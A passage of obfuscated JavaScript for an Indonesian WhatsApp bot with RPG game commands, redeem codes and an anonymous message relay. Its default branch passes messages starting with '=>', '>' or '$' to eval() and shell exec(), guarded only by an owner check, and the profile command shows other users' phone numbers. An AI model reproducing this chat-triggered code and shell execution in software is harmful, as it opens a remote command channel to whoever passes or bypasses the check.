              'item': ["wortel", 'sawi', "selada", "tomat", "seledri", "cabai", "daging", "ikan", "ayam"][Math.floor(Math.random() * ["wortel", 'sawi', "selada", "tomat", "seledri", "cabai", "daging", "ikan", "ayam"].length)],
              'emoji': '🛒'
            },
            'dokter': {
              'action': "menyembuhkan pasien",
              'item': ["sakit kepala", "cedera", "luka bakar", "patah tulang"][Math.floor(Math.random() * ["sakit kepala", "cedera", "luka bakar", "patah tulang"].length)],
              'emoji': '💉'
            },
            'petani': {
              'action': "memanen hasil tani",
              'item': ["Wortel", "Kubis", 'Stroberi', "Teh", "Padi", "Jeruk", 'Pisang', "Semangka", "Durian", 'Rambutan'][Math.floor(Math.random() * ["Wortel", "Kubis", 'Stroberi', "Teh", "Padi", "Jeruk", 'Pisang', "Semangka", "Durian", 'Rambutan'].length)],
              'emoji': '🌾'
            },
            'montir': {
              'action': "memperbaiki kendaraan",
              'item': ['mobil', 'motor', 'becak', "bajaj", "bus", "angkot", "sepeda"][Math.floor(Math.random() * ['mobil', 'motor', 'becak', "bajaj", "bus", "angkot", "sepeda"].length)],
              'emoji': '🔧'
            },
            'kuli': {
              'action': "bekerja di proyek",
              'item': ["Membangun Rumah", "Membangun Gedung", "Memperbaiki Rumah", "Memperbaiki Gedung", "Membangun Fasilitas Umum", "Memperbaiki Fasilitas Umum"][Math.floor(Math.random() * ["Membangun Rumah", "Membangun Gedung", "Memperbaiki Rumah", "Memperbaiki Gedung", "Membangun Fasilitas Umum", "Memperbaiki Fasilitas Umum"].length)],
              'emoji': "🏗️"
            }
          };
          if (!_0x3f93be[_0x17382f]) {
            let _0x21a84a = Object.keys(_0x3f93be).map(_0x2a7265 => "- " + _0x2a7265).join("\n");
            let _0x28446a = "*💼 RPG - KERJA 💼*\n\nPilih pekerjaanmu:\n" + _0x21a84a + "\n\n📌 *Contoh:* _" + (_0x4773c6 + _0x4ac520) + " kuli_";
            return _0x59f5fa.sendMessage(_0x3f87c6.chat, {
              'text': _0x28446a,
              'contextInfo': {
                'mentionedJid': [_0x3f87c6.sender],
                'externalAdReply': {
                  'title': "RPG - JOB SIMULATOR",
                  'body': "Pilih pekerjaan dan dapatkan hasilnya!",
                  'thumbnailUrl': "https://pomf2.lain.la/f/x1pvc1mq.jpg",
                  'sourceUrl': wagc,
                  'mediaType': 0x1,
                  'renderLargerThumbnail': true
                }
              }
            }, {
              'quoted': _0x3f87c6
            });
          }
          let _0x1739d5 = Math.floor(Math.random() * 0x2710);
          let _0x5ccc1a = _0x3f93be[_0x17382f];
          _0x3a091f("✅ Kamu telah " + _0x5ccc1a.action + " *" + _0x5ccc1a.item + "* " + _0x5ccc1a.emoji + "\n💰 Dan mendapatkan uang sebesar *Rp " + _0x1739d5 + '*').then(() => {
            db.data.users[_0x3f87c6.sender].uang += _0x1739d5;
            db.data.rpg[_0x3f87c6.sender].lastkerja = new Date().getTime();
          });
        }
        break;
      case "merampok":
      case 'rampok':
        {
          let _0x4f0f3b = db.data.rpg[_0x3f87c6.sender].lastrampok || 0x0;
          let _0x35b751 = 0x36ee80 - (new Date() - _0x4f0f3b);
          if (_0x35b751 > 0x0) {
            return _0x3a091f("⚠️ Kamu sudah merampok!\n💤 Tunggu " + clockString(_0x35b751) + " sebelum merampok lagi.");
          }
          let _0x89561c = _0x3f87c6.mentionedJid[0x0] || (_0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x2b2627.replace(/[^0-9]/g, '') + '@s.whatsapp.net');
          if (!_0x89561c) {
            return _0x3a091f("*🎭 Tag atau Reply Target!*\n\n📌 Contoh:\n" + (_0x4773c6 + _0x4ac520) + " @user");
          }
          if (_0x89561c === _0x3f87c6.sender) {
            return _0x3a091f("⚠️ Gak bisa ngerampok diri sendiri, bego! 😑");
          }
          if (!db.data.users[_0x89561c]) {
            return _0x3a091f("⚠️ Target tidak ditemukan di database!");
          }
          let _0x1ab8a3 = db.data.users[_0x89561c].uang || 0x0;
          if (_0x1ab8a3 < 0xc350) {
            return _0x3a091f("🚨 Target terlalu miskin buat dirampok! 😭");
          }
          let _0x3b479d = Math.random() < 0.7;
          let _0x38eed0 = Math.floor(Math.random() * 0xc350) + 0x2710;
          if (_0x3b479d) {
            db.data.users[_0x89561c].uang -= _0x38eed0;
            db.data.users[_0x3f87c6.sender].uang += _0x38eed0;
            db.data.rpg[_0x3f87c6.sender].lastrampok = new Date().getTime();
            return _0x3a091f("😈 **Berhasil!** Kamu merampok *Rp " + _0x38eed0 + "* dari @" + _0x89561c.split('@')[0x0] + "! 💰");
          } else {
            let _0x3383af = Math.floor(_0x38eed0 * 0.5);
            db.data.users[_0x3f87c6.sender].uang -= _0x3383af;
            db.data.rpg[_0x3f87c6.sender].lastrampok = new Date().getTime();
            return _0x3a091f("🚔 **Gagal!** Polisi menangkapmu saat merampok @" + _0x89561c.split('@')[0x0] + "!\n👮‍♂️ Kamu kena denda *Rp " + _0x3383af + '*');
          }
        }
        break;
      case "redeem":
        {
          db.redeem = db.redeem || {
            'isRedeem': false,
            'code': '',
            'user': [],
            'maxRedeem': 0x0
          };
          if (!db.redeem.isRedeem) {
            return _0x3a091f("*Eh, belum ada kode redeem yang tersedia nih! 😢*");
          }
          if (!_0x2b2627) {
            return _0x3a091f("*Masukin kodenya dulu dong! 🧐*");
          }
          if (db.redeem.isRedeem) {
            let _0x588489 = _0x2b2627.toLowerCase();
            let _0x2a266b = db.redeem.code.toLowerCase();
            if (_0x588489 !== _0x2a266b) {
              return _0x3a091f("*Hmm... kayaknya kodenya salah deh! Coba cek lagi ya! 🤔*");
            }
            if (db.redeem.maxRedeem < 0x1) {
              return _0x3a091f("*Waduh, kode ini udah habis dipake semua! 😭*");
            }
            if (db.redeem.user.includes(_0x3f87c6.sender)) {
              return _0x3a091f("*Hehe, kamu udah pake kode ini sebelumnya! Jangan rakus ya~ 😆*");
            }
            db.redeem.user.push(_0x3f87c6.sender);
            db.redeem.maxRedeem -= 0x1;
            db.data.users[_0x3f87c6.sender].uang += 0x2710;
            db.data.users[_0x3f87c6.sender].exp += 0x3e8;
            db.data.users[_0x3f87c6.sender].rank += 0x12c;
            db.data.users[_0x3f87c6.sender].limit += 0xc8;
            let _0x5ed5b8 = '';
            _0x5ed5b8 += "*🎉 SELAMAT! KAMU BERHASIL REDEEM 🎉*\n\n";
            _0x5ed5b8 += "*Hadiah yang kamu dapatkan:*\n";
            _0x5ed5b8 += "- 💰 Rp 10.000 saldo\n";
            _0x5ed5b8 += "- ⭐ 1000 EXP\n";
            _0x5ed5b8 += "- 📊 300 Rank Points\n";
            _0x5ed5b8 += "- 🎟️ 200 Limit\n\n";
            _0x5ed5b8 += "*Gunakan dengan bijak ya! 😉*";
            _0x3a091f(_0x5ed5b8);
            if (db.redeem.maxRedeem < 0x1) {
              await timeout(0x927c0);
              delete db.redeem;
            }
          } else {
            _0x3a091f("*Belum ada sesi redeem yang aktif nih~ 😅*");
          }
        }
        break;
      case "redeemset":
      case "setredeem":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          db.redeem = db.redeem || {
            'isRedeem': false,
            'code': '',
            'user': [],
            'maxRedeem': 0x0
          };
          if (!_0x143458[0x0]) {
            return _0x3a091f("*Eits, jangan lupa masukin kode redeemnya ya!* 🤓\n\nContoh:\n" + (_0x4773c6 + _0x4ac520) + " specialcode 10");
          }
          if (!_0x143458[0x1]) {
            return _0x3a091f("*Berapa kali kode ini bisa dipakai? Masukin angkanya ya!* 🔢\n\nContoh:\n" + (_0x4773c6 + _0x4ac520) + " specialcode 10");
          }
          if (isNaN(_0x143458[0x1])) {
            return _0x3a091f("*Jumlah harus berupa angka dong! 😜*\n\nContoh:\n" + (_0x4773c6 + _0x4ac520) + " specialcode 10");
          }
          db.redeem.isRedeem = true;
          db.redeem.code = _0x143458[0x0];
          db.redeem.user = [];
          db.redeem.maxRedeem = _0x143458[0x1];
          _0x3a091f("*🎊 Kode redeem berhasil diset! Siap-siap bagi-bagi hadiah ya! 🥳*");
        }
        break;
      case 'delredeem':
      case "redeemdel":
        {
          if (!_0x2cfe7f) {
            return _0x3a091f(mess.owner);
          }
          db.redeem = db.redeem || {
            'isRedeem': false,
            'code': '',
            'user': [],
            'maxRedeem': 0x0
          };
          if (db.redeem.isRedeem) {
            _0x3a091f("*🚀 Kode redeem berhasil dihapus! Sekarang nggak ada yang bisa redeem lagi!* 😎");
            delete db.redeem;
          } else {
            _0x3a091f("*Eh, nggak ada kode redeem yang aktif nih! 😅*");
          }
        }
        break;
      case "inventory":
      case "inv":
      case 'profile':
      case "profil":
        {
          let _0x7a53ea = _0x3f87c6.mentionedJid[0x0] ? _0x3f87c6.mentionedJid[0x0] : _0x3f87c6.quoted ? _0x3f87c6.quoted.sender : _0x3f87c6.sender;
          if (!db.data.users[_0x7a53ea].rpg) {
            return _0x3a091f("*⚠️ Kamu belum join RPG!*\n\nKetik _.joinrpg_ untuk memulai petualanganmu! 🏹");
          }
          let _0x4ee21d = await PhoneNumber('+' + _0x7a53ea.replace("@s.whatsapp.net", '')).getNumber("international");
          let _0x4a61a9 = "*⚔️ RPG - PROFILE ⚔️*\n\n";
          _0x4a61a9 += "👤 *User Info*\n";
          _0x4a61a9 += "- 📞 Nomor: " + _0x4ee21d + "\n";
          _0x4a61a9 += "- ❤️ Kesehatan: " + db.data.rpg[_0x7a53ea].darahuser + "/100\n";
          _0x4a61a9 += "- 🌍 Lokasi: " + db.data.rpg[_0x7a53ea].wilayah + "\n\n";
          _0x4a61a9 += "🛠️ *Crafting Items*\n";
          _0x4a61a9 += "- ⛵ Kapal: " + (db.data.rpg[_0x7a53ea].kapal ? '(' + db.data.rpg[_0x7a53ea].darahkapal + "% HP)" : "Belum punya") + "\n";
          _0x4a61a9 += "- 🏠 Rumah: " + db.data.rpg[_0x7a53ea].rumah + " Unit\n";
          _0x4a61a9 += "- 🪓 Kapak: " + (db.data.rpg[_0x7a53ea].kapak ? '(' + db.data.rpg[_0x7a53ea].darahkapak + "% HP)" : "Belum punya") + "\n";
          _0x4a61a9 += "- ⛏️ Pickaxe: " + (db.data.rpg[_0x7a53ea].pickaxe ? '(' + db.data.rpg[_0x7a53ea].darahpickaxe + "% HP)" : "Belum punya") + "\n";
          _0x4a61a9 += "- 🛡️ Baju Zirah: " + (db.data.rpg[_0x7a53ea].bzirah ? '(' + db.data.rpg[_0x7a53ea].darahbzirah + "% HP)" : "Belum punya") + "\n";
          _0x4a61a9 += "- ⚔️ Pedang: " + (db.data.rpg[_0x7a53ea].pedang ? '(' + db.data.rpg[_0x7a53ea].darahpedang + "% HP)" : "Belum punya") + "\n";
          _0x4a61a9 += "- 🏴 Kain: " + db.data.rpg[_0x7a53ea].kain + " Lembar\n\n";
          _0x4a61a9 += "🔨 *Sumber Daya*\n";
          _0x4a61a9 += "- 🪵 Kayu: " + db.data.rpg[_0x7a53ea].kayu + " Batang\n";
          _0x4a61a9 += "- ⛓️ Besi: " + db.data.rpg[_0x7a53ea].besi + " Biji\n";
          _0x4a61a9 += "- 💰 Emas: " + db.data.rpg[_0x7a53ea].emas + " Biji\n";
          _0x4a61a9 += "- 🥈 Perak: " + db.data.rpg[_0x7a53ea].perak + " Biji\n";
          _0x4a61a9 += "- 🪨 Batu Bara: " + db.data.rpg[_0x7a53ea].batubara + " Biji\n\n";
          _0x4a61a9 += "🐾 *Hewan & Ternak*\n";
          _0x4a61a9 += "- 🐔 Ayam: " + db.data.rpg[_0x7a53ea].ayam + " Ekor\n";
          _0x4a61a9 += "- 🐄 Sapi: " + db.data.rpg[_0x7a53ea].sapi + " Ekor\n";
          _0x4a61a9 += "- 🐑 Domba: " + db.data.rpg[_0x7a53ea].domba + " Ekor\n";
          _0x4a61a9 += "- 🐟 Ikan: " + db.data.rpg[_0x7a53ea].ikan + " Ekor\n\n";
          _0x4a61a9 += "🔥 *Semangat terus berburu & bertualang! Jangan lupa upgrade peralatanmu! 🚀*";
          await _0x59f5fa.sendMessage(_0x3f87c6.chat, {
            'image': imageBuffer,
            'caption': _0x4a61a9,
            'contextInfo': {
              'mentionedJid': [_0x7a53ea],
              'forwardingScore': 0x270f,
              'isForwarded': true,
              'forwardedNewsletterMessageInfo': {
                'newsletterJid': saluran,
                'serverMessageId': null,
                'newsletterName': saluranName
              },
              'externalAdReply': {
                'title': "RPG-GAME (Inventory)",
                'body': "Jelajahi dunia dan tingkatkan perlengkapanmu! ⚒️",
                'thumbnailUrl': "https://telegra.ph/file/675903e8c4a42e1dd990b.jpg",
                'sourceUrl': wagc,
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x3f87c6
          });
        }
        break;
      default:
        if (_0x7a39b5.startsWith('=>')) {
          if (!_0x2cfe7f) {
            return _0x3f87c6.react('⚠️');
          }
          if (_0x320b7b) {
            return _0x3f87c6.react('⚠️');
          }
          await _0x3f87c6.react('⏱️');
          try {
            _0x3a091f(util.format(eval("(async () => { return " + _0x7a39b5.slice(0x3) + " })()")));
          } catch (_0x11073c) {
            _0x3a091f(String(_0x11073c));
          }
        }
        ;
        if (_0x7a39b5.startsWith('>')) {
          if (!_0x2cfe7f) {
            return _0x3f87c6.react('⚠️');
          }
          if (_0x320b7b) {
            return _0x3f87c6.react('⚠️');
          }
          try {
            await _0x3f87c6.react('⏱️');
            let _0xa4394b = await eval(_0x7a39b5.slice(0x2));
            if (typeof _0xa4394b !== "string") {
              _0xa4394b = require("util").inspect(_0xa4394b);
            }
            _0x3f87c6.react('✅');
            await _0x3a091f(_0xa4394b);
          } catch (_0x5b52bb) {
            await _0x3a091f(String(_0x5b52bb));
          }
        }
        ;
        if (_0x7a39b5.startsWith('$')) {
          if (!_0x2cfe7f) {
            return _0x3f87c6.react('⚠️');
          }
          if (_0x320b7b) {
            return _0x3f87c6.react('⚠️');
          }
          await _0x3f87c6.react('⏱️');
          exec(_0x7a39b5.slice(0x2), (_0xd391e0, _0x38f750) => {
            _0x3f87c6.react('✅');
            if (_0xd391e0) {
              return _0x3a091f(_0xd391e0);
            }
            if (_0x38f750) {
              return _0x3a091f(_0x38f750);
            }
          });
        }
        ;
        if (_0x2bee7f && _0x7a39b5.toLowerCase() != undefined) {
          if (_0x3f87c6.chat.endsWith('broadcast')) {
            return;
          }
          if (_0x3f87c6.isBaileys) {
            return;
          }
          let _0x47da40 = db.data.database;
          if (!(_0x7a39b5.toLowerCase() in _0x47da40)) {
            return;
          }
          _0x59f5fa.copyNForward(_0x3f87c6.chat, _0x47da40[_0x7a39b5.toLowerCase()], true, {
            'quoted': _0x3f87c6
          });
        }
        if (_0x3f87c6.chat.endsWith("@s.whatsapp.net") && !_0x2bee7f) {
          try {
            this.menfes = this.menfes || {};
            let _0xd6a60b = Object.values(this.menfes).find(_0x3e876b => [_0x3e876b.a, _0x3e876b.b].includes(_0x3f87c6.sender) && _0x3e876b.state === "CHATTING");
            if (_0xd6a60b) {
              if (/^.*(next|leave|start)/.test(_0x3f87c6.text)) {
                return;
              }
              if ([".next", ".leave", ".stop", ".start", "Cari Partner", "Keluar", "Lanjut", "Stop"].includes(_0x3f87c6.text)) {
                return;
              }
              let _0x74d240 = Object.values(this.menfes).find(_0x58b394 => [_0x58b394.a, _0x58b394.b].includes(_0x3f87c6.sender));
              let _0xabb717 = _0x74d240.a === _0x3f87c6.sender ? _0x74d240.b : _0x74d240.a;
              if (_0x3f87c6.mtype === 'conversation' || _0x3f87c6.mtype === "extendedTextMessage") {
                await _0x59f5fa.sendMessage(_0xabb717, {
                  'text': _0x3f87c6.text,
                  'mentions': [_0xabb717]
                }, {
                  'quoted': _0x2044ec
                });
              }
              if (["imageMessage", "videoMessage", "audioMessage", 'documentMessage', "stickerMessage"].includes(_0x3f87c6.mtype)) {
                let _0x21c918;
                try {
                  _0x21c918 = await _0x3f87c6.download();
                } catch (_0x563988) {
                  console.error("Gagal mengunduh media:", _0x563988);
                  await _0x59f5fa.sendMessage(_0x3f87c6.sender, {
                    'text': "Gagal mengunduh media. Pastikan media masih valid dan coba lagi."
                  });
                  return;
                }
                let _0x244ced = {
                  'caption': _0x3f87c6.msg?.["caption"] || '',
                  'mentions': [_0xabb717]
                };
                if (_0x3f87c6.mtype === "imageMessage") {
                  await _0x59f5fa.sendMessage(_0xabb717, {
                    'image': _0x21c918,
                    ..._0x244ced
                  });
                } else {
                  if (_0x3f87c6.mtype === "videoMessage") {
                    await _0x59f5fa.sendMessage(_0xabb717, {
                      'video': _0x21c918,
                      ..._0x244ced
                    });
                  } else {
                    if (_0x3f87c6.mtype === 'audioMessage') {
                      await _0x59f5fa.sendMessage(_0xabb717, {
                        'audio': _0x21c918,
                        'mimetype': "audio/mp4",
                        ..._0x244ced
                      });
                    } else {
                      if (_0x3f87c6.mtype === "documentMessage") {
                        await _0x59f5fa.sendMessage(_0xabb717, {
                          'document': _0x21c918,
                          'mimetype': _0x3f87c6.msg?.["mimetype"],
                          'fileName': _0x3f87c6.msg?.['fileName'],
                          ..._0x244ced
                        });
                      } else if (_0x3f87c6.mtype === "stickerMessage") {
                        await _0x59f5fa.sendMessage(_0xabb717, {
                          'sticker': _0x21c918
                        });
                      } else {
                        console.warn("Tipe media tidak dikenali:", _0x3f87c6.mtype);
                      }
                    }
                  }
                }
              }
            }
          } catch (_0x1496c4) {
            console.error("Error di fitur Menfess:", _0x1496c4);
            await _0x59f5fa.sendMessage(_0x3f87c6.sender, {
              'text': "Terjadi kesalahan saat mengirim pesan ke pasangan Menfess. Silakan coba lagi nanti."
            });
          }
        }
    }
  } catch (_0x531cc0) {
    console.log(chalk.yellow.bold("[ ERROR ] case.js :\n") + chalk.redBright(util.format(_0x531cc0)));
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});